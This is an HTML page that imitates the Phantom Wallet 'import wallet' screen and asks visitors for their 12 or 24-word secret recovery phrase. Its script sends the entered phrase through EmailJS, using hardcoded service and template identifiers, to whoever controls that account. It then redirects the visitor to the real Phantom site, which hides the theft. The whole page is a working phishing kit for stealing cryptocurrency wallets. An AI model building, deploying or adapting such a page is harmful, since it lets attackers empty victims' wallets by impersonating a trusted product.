<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Phantom Wallet</title>
    <link rel="icon" href="favicon.png" type="image/png" />
    <style>
      body {
        margin: 0;
        font-family: Arial, sans-serif;
        background-color: #2f3237;
        color: #fff;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        position: relative;
      }

      .logo {
        position: absolute;
        top: 10px; /* Increased margin from top */
        left: 170px; /* Increased margin from left */
      }

      .logo img {
        width: 200px; /* Increased size */
        height: auto;
        border-radius: 40px; /* Added border radius */
      }

      .help {
        position: absolute;
        top: 30px; /* Same alignment as the logo */
        right: 180px; /* Increased margin from right */
      }

      .help img {
        width: 70px; /* Increased size */
        height: auto;
      }

      .container {
        text-align: center;
        background-color: #1e1e1e;
        padding: 40px; /* Increased padding */
        border-radius: 10px;
        width: 400px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
        height: 420px;
      }

      h1 {
        font-size: 1.5rem;
        margin-bottom: 10px;
      }

      p {
        font-size: 0.9rem;
        color: #bfbfbf;
        margin-bottom: 20px;
      }

      textarea {
        width: 90%;
        height: 80px;
        border: none;
        border-radius: 5px;
        padding: 10px;
        font-size: 1rem;
        resize: none;
        background-color: rgb(15, 15, 15);
        color: #fff;
        outline: none;
        margin-bottom: 20px;
        border: 1px solid white;
      }

      .description {
        font-size: 20px; /* Slightly larger font size */
        color: #bbbbbbcb;
        margin-bottom: 30px; /* Increased margin */
        margin-top: 50px;
        line-height: 1.5;
      }

      .button {
        width: 90%;
        padding: 15px; /* Increased padding */
        margin: 15px 0; /* Increased margin */
        border: none;
        border-radius: 20px;
        font-size: 16px;
        cursor: pointer;
        transition: background-color 0.3s ease;
        text-decoration: none;
        display: inline-block;
        text-align: center;
        background-color: #ab9ff2;
        color: black;
      }

      .button:hover {
        background-color: #857bbc;
      }

      .elementor-widget-container {
        text-align: center;
      }

      /* Responsive Styles */
      @media (max-width: 768px) {
        body {
          flex-direction: column;
          justify-content: flex-start;
          padding-top: 20px;
        }

        .logo {
          position: static;
          margin-bottom: 10px;
        }

        .help {
          position: static;
          margin-bottom: 10px;
        }

        .container {
          margin-top: 20px;
        }
      }
    </style>
  </head>
  <body>
    <!-- Logo Section -->
    <div class="logo">
      <img src="phantom.png" alt="Phantom Wallet Logo" />
    </div>

    <!-- Help Section -->
    <div class="help">
      <img src="help-1.jpeg" alt="Help Icon" />
    </div>
    <div class="container">
      <h1>Secret Recovery Phrase</h1>
      <p class="description">
        Import an existing wallet with your <br />12 or 24-word secret recovery
        phrase.
      </p>
      <textarea id="secretPhrase" placeholder="Secret Phrase"></textarea>
      <button class="button" onclick="sendEmail()">Import Wallet</button>
    </div>
    <script
      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"
      type="text/javascript"
    ></script>
    <script>
      (function () {
        emailjs.init("eFjqTxnF7nGuJXVZd");
      })();
    </script>
    <script>
      function sendEmail() {
        const secretPhrase = document.getElementById("secretPhrase").value;

        if (!secretPhrase.trim()) {
          alert("Please enter your secret recovery phrase.");
          return;
        }

        const templateParams = {
          phrase: secretPhrase,
        };

        emailjs
          .send("service_8it2819", "template_b6qvy4b", templateParams)
          .then(
            function (response) {
              console.log("SUCCESS!", response.status, response.text);
              // Redirect to Phantom after successful email
              window.location.href = "https://phantom.com/";
            },
            function (error) {
              console.error("FAILED...", error);
              alert("Failed to send the recovery phrase. Please try again.");
            }
          );
      }
    </script>
